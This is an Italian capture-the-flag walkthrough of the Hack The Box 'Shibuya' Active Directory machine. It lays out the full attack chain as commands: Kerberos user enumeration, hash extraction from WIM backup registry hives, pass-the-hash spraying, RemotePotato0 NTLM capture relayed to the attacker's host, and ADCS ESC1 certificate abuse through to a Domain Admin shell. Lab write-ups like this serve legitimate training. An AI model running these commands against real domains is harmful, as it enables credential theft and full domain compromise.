---
title: 'HTB Shibuya Walkthrough: WIM, RemotePotato0 e ADCS ESC1'
slug: htb-shibuya-walkthrough
description: 'Hack The Box Shibuya Write-up: enumera utenti via Kerberos, estrai gli hash NTLM dai backup WIM e sfrutta RemotePotato0 e ADCS ESC1 fino a Domain Admin.'
image: /shibuya-walktrough-hack-the-box-writeup.webp
draft: false
date: 2026-07-21T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - HTB Shibuya
  - WIM
  - RemotePotato0
---

# HTB Shibuya Walkthrough: WIM, RemotePotato0 ed ESC1 fino a Domain Admin

Shibuya è una macchina Windows di difficoltà Hard su Hack The Box, incentrata quasi interamente su Active Directory. Il percorso di compromissione è insolito: parte da un attacco poco comune (l'estrazione di hive di registro da immagini di backup Windows Imaging Format), passa per un relay incrociato tra sessioni RDP, e si chiude con una classica escalation ADCS di tipo ESC1. In questo articolo ripercorriamo l'intera catena, spiegando il *perché* di ogni passaggio e non solo il comando da copiare — perché il vero valore di un walkthrough è capire la logica, non la sequenza di tasti.

## Recon iniziale

Una scansione completa delle porte TCP mostra un set di servizi tipico di un Domain Controller: Kerberos (88), LDAP e LDAP su Global Catalog (3268/3269), RPC (135), SMB (445), e la porta di cambio password Kerberos (464). Da notare due dettagli fuori standard: **SSH è aperto sulla 22** (raro su un DC, ma non impossibile su Windows Server moderni con OpenSSH installato), mentre **LDAP e LDAPS "normali" sulle porte 389/636 non sono raggiungibili** — un vincolo che condizionerà buona parte dell'enumerazione successiva, perché molti tool si aspettano di poter usare quelle porte di default.

Il nome del dominio (`shibuya.vl`) e dell'host (`AWSJPDC0522`) emergono dai certificati TLS esposti su LDAPS e RDP:

```bash
nmap -p- --min-rate 10000 <IP>
nmap -sCV -p 22,53,88,135,139,445,464,593,3268,3269,3389,9389 <IP>
```

Da lì conviene generare subito una riga hosts coerente:

```bash
netexec smb <IP> --generate-hosts-file hosts
```

## Enumerazione utenti via Kerberos

Senza credenziali, l'unica via di enumerazione praticabile passa da Kerberos: il servizio KDC risponde in modo diverso a seconda che uno username esista o meno nel dominio, e questo permette un brute force di enumerazione (non delle password, solo dei nomi utente):

```bash
kerbrute userenum -d shibuya.vl --dc <IP> /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
```

Lanciandolo contro una wordlist ampia emergono rapidamente due nomi sospetti: `red` e `purple` — troppo corti e generici per essere utenti "umani" reali, un indizio che si tratti di **account macchina** (i naming pattern semplici sono spesso residui di autojoin o provisioning automatico).

## Il trucco del "password uguale a username"

Una verifica classica su ambienti AD è controllare se qualche account ha la password identica allo username:

```bash
netexec smb shibuya.vl -u red -p red --no-bruteforce --continue-on-success
```

Il tentativo diretto via NTLM fallisce — ma il dettaglio importante è che **gli account macchina non accettano mai autenticazione NTLM per policy**, quindi un fallimento NTLM su questi due nomi non prova nulla. Ripetendo lo stesso test forzando l'autenticazione via **Kerberos** (flag `-k`):

```bash
netexec smb shibuya.vl -u red -p red --no-bruteforce --continue-on-success -k
```

entrambi funzionano: `red:red` e `purple:purple` sono credenziali valide.

Questo è un punto concettuale che vale la pena fissare: quando si sospetta un account macchina, il protocollo di autenticazione usato per verificarlo conta quanto la password stessa.

## Da red a svc\_autojoin: share e commento in chiaro

Con `red` autenticato si può enumerare le share SMB esposte:

```bash
netexec smb shibuya.vl -u red -p red -k --shares
```

Oltre alle share di default (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) compare `users` e una share particolare chiamata `images$`, non accessibile con questo utente.

Più interessante è il dump completo della lista utenti del dominio, possibile perché ora si dispone di credenziali valide:

```bash
netexec smb shibuya.vl -k -u red -p red --users
```

Tra i risultati compare un account di servizio, `svc_autojoin`, con un **campo descrizione** che contiene, in chiaro, quella che sembra a tutti gli effetti una password. Le descrizioni utente in AD sono un campo testuale libero e vengono enumerate da chiunque abbia accesso in lettura — un errore di configurazione da manuale, ma sorprendentemente comune in ambienti reali: chi amministra il dominio a volte lascia lì note "temporanee" per comodità, dimenticandosi che qualunque utente autenticato può leggerle.

Verificando quella stringa come password:

```bash
netexec smb shibuya.vl -u svc_autojoin -p '<stringa_dalla_descrizione>'
```

l'autenticazione SMB riesce.

## Le immagini WIM e il registro nascosto

`svc_autojoin` ha accesso alla share `images$`. Prima la si mappa:

```bash
netexec smb shibuya.vl -u svc_autojoin -p '<password>' --spider 'images$' --regex .
```

poi si scarica tutto con `smbclient`:

```bash
smbclient -U shibuya.vl/svc_autojoin '//shibuya.vl/images$'
smb: \> prompt off
smb: \> mget *
```

Compaiono tre file `.wim` (Windows Imaging Format — il formato usato da Windows per backup e deployment di sistema) più un file `.cab` di metadati Volume Shadow Copy.

Un file WIM è essenzialmente un archivio: 7-Zip lo apre e ne elenca il contenuto senza doverlo montare:

```bash
file *.wim
7z l AWSJPWK0222-01.wim
```

Il primo file mostra una struttura tipica di una cartella utenti Windows (`Administrator`, `simon.watson`, `Default`, `Public`) — segnale che è **il contenuto di un profilo utente**. Il secondo file è quello davvero interessante: dentro c'è una cartella con le hive di registro complete (`SAM`, `SYSTEM`, `SECURITY`) usate per calcolare gli hash delle password locali. Si estraggono così:

```bash
7z x AWSJPWK0222-02.wim SAM
7z x AWSJPWK0222-02.wim SYSTEM
7z x AWSJPWK0222-02.wim SECURITY
```

e si passano a `secretsdump.py` in modalità locale (offline, su file invece che su un host live):

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
```

L'output restituisce gli hash NTLM degli account locali della macchina da cui proviene il backup, incluso un account non standard oltre ai soliti Administrator/Guest.

## Password spraying e primo accesso interattivo

Con un set di hash in mano, il passo successivo è provarli — via pass-the-hash, senza bisogno di craccarli — contro gli altri account noti del dominio:

```bash
netexec smb shibuya.vl -u users -H <hash_ntlm> --continue-on-success
```

Uno spray mirato porta a un match su `simon.watson`, il nome comparso nella struttura del WIM. Da lì, non potendo fare SSH direttamente con un hash NTLM, si passa dalla share `users` per depositare la propria chiave pubblica:

```bash
smbclient -U simon.watson --pw-nt-hash //shibuya.vl/users <hash_ntlm>
smb: \simon.watson\> mkdir .ssh
smb: \simon.watson\> put id_ed25519.pub .ssh\authorized_keys
```

e infine collegarsi:

```bash
ssh -i id_ed25519 simon.watson@shibuya.vl
```

Da questo punto si passa da "enumerazione remota" a "shell su AD Windows" — un salto qualitativo importante, perché ora è possibile lanciare BloodHound/SharpHound e leggere lo stato reale del dominio dal punto di vista di un utente autenticato.

## Un'altra sessione sullo stesso host: il cross-session relay

Con una shell attiva, si raccoglie il dominio con SharpHound:

```powershell
.\SharpHound.exe -c all
```

L'analisi in BloodHound mostra che `simon.watson` ha una sessione attiva su `AWSJPDC0522` — normale, è la propria shell SSH. Ma guardando le sessioni della macchina compare anche un secondo utente, `nigel.mills`. Per un approfondimento su come enumerare e abusare di questo tipo di sessioni attive, anche oltre BloodHound, vedi la nostra guida [HasSession](https://hackita.it/articoli/has-session/).

Per confermarlo da riga di comando serve `qwinsta`, che però su una shell non interattiva (come SSH senza TTY completo) restituisce "No session exists". Il trucco è forzare un logon di **tipo 9** con RunasCs — approfondiamo cosa significa nel dettaglio nella nostra guida ai [logon type di Windows](https://hackita.it/articoli/logon-type-windows/) — con credenziali anche fittizie, che servono solo a "sbloccare" il contesto necessario e non vengono verificate:

```powershell
.\RunasCs.exe hackita hackita qwinsta -l 9
```

L'output mostra `nigel.mills` connesso in RDP nella sessione con ID 1.

Questo apre la porta a una tecnica interessante: **RemotePotato0**. A differenza dei classici "Potato" (JuicyPotato, PrintSpoofer) che sfruttano `SeImpersonatePrivilege` per ottenere SYSTEM in locale, RemotePotato0 non impersona nulla localmente — attiva un oggetto **DCOM** nella sessione dell'utente target e lo forza a inviare un'autenticazione NTLM verso un indirizzo scelto da chi attacca. Il risultato è la cattura dell'hash NTLMv2 dell'altro utente loggato, senza toccare direttamente il suo processo.

Su Windows Server moderni il resolver DCOM coinvolto non gira più in locale per motivi di hardening: il primo tentativo puntato su una porta arbitraria va in timeout, perché il firewall di dominio blocca il traffico in entrata non esplicitamente permesso. Serve quindi trovare una porta che il firewall lasci passare:

```powershell
netsh advfirewall firewall show rule name=all
```

Filtrando l'output per regole abilitate, in entrata, protocollo TCP, emerge una regola **custom** (non di sistema) con un range esplicitamente aperto: `8000-9000`. Si sceglie una porta in quel range (es. 8888) e si prepara il redirector sul proprio host:

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<IP_target>:8888
```

poi si lancia RemotePotato0 puntato sulla sessione 1, con il proprio IP e la stessa porta:

```powershell
.\RemotePotato0.exe -m 2 -s 1 -x <IP_attaccante> -p 8888
```

La sessione RDP di `nigel.mills` genera un'autenticazione che viene catturata come hash NetNTLMv2 — craccabile offline con `hashcat` contro una wordlist comune:

```bash
hashcat nigel.mills.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Il crack, in questo caso, va a buon fine quasi subito, dando accesso a una password in chiaro con cui autenticarsi via SSH come `nigel.mills`.

## ADCS ed ESC1: l'ultimo miglio verso Domain Admin

Con le credenziali di `nigel.mills` si arriva finalmente a poter enumerare la configurazione di **Active Directory Certificate Services** con Certipy (serve un accesso LDAP, quindi via proxychains/SSH SOCKS se le porte 389/636 non sono direttamente raggiungibili):

```bash
proxychains certipy find -vulnerable -u nigel.mills -p '<password>' -dc-ip 127.0.0.1 -stdout
```

L'enumerazione rivela una Certification Authority con un template personalizzato i cui permessi di enrollment sono aperti a un gruppo a cui l'utente appartiene, e — punto chiave — il template consente all'utente di **specificare autonomamente il Subject Alternative Name** della richiesta di certificato (`Enrollee Supplies Subject: true`), oltre a permettere l'autenticazione client. Certipy lo segnala esplicitamente come vulnerabile a ESC1 (e, in questo caso, anche a ESC2/ESC3 come varianti collegate).

Questa combinazione è la definizione tecnica di **ESC1**: un utente a bassi privilegi può richiedere un certificato dichiarando di essere qualcun altro — in questo caso l'account amministrativo del dominio — e ottenere un certificato valido per autenticarsi come quell'utente. Approfondiamo la meccanica di questa tecnica, passo per passo, nel nostro articolo dedicato a [ESC1](https://hackita.it/articoli/esc1-adcs/).

La richiesta si fa con `certipy req`, specificando il template vulnerabile e lo UPN dell'account da impersonare:

```bash
proxychains certipy req -u nigel.mills -p '<password>' -dc-ip 127.0.0.1 \
  -ca <nome-CA> -template <nome-template> -upn _admin@shibuya.vl \
  -target AWSJPDC0522.shibuya.vl -key-size 4096
```

(`-key-size 4096` serve solo perché il template in questo caso richiede una chiave RSA più grande del default di Certipy.) Se l'autenticazione con quel certificato fallisce per SID mismatch, va aggiunto anche `-sid` con il SID dell'account target, recuperabile da BloodHound.

Con il certificato ottenuto si autentica come account privilegiato (via PKINIT/Kerberos):

```bash
proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
```

recuperandone così anche l'hash NT, con cui infine si apre una sessione WinRM come Domain Administrator:

```bash
proxychains evil-winrm -i 127.0.0.1 -u _admin -H <hash_ntlm>
```

## Considerazioni finali

Shibuya è un buon esempio di come una singola macchina possa incatenare tecniche molto diverse tra loro: enumerazione Kerberos "silenziosa", un errore di igiene informatica banale (password nel campo descrizione), un vettore forense poco battuto (hive di registro dentro backup WIM), un attacco di relay di sessione locale (RemotePotato0), e infine una misconfigurazione ADCS da manuale. Se ADCS è un argomento che vi interessa approfondire, sul blog trattiamo anche [ESC2](https://hackita.it/articoli/esc2-adcs/) e [ESC3](https://hackita.it/articoli/esc3-adcs/), oltre alla guida completa che copre l'intero spettro delle tecniche ESC1–ESC16.

***

*Articolo a scopo didattico. Hack The Box è una piattaforma di training legale con macchine pensate appositamente per essere attaccate in ambiente controllato — nessuna delle tecniche descritte qui deve essere applicata su sistemi per cui non si ha autorizzazione esplicita.*
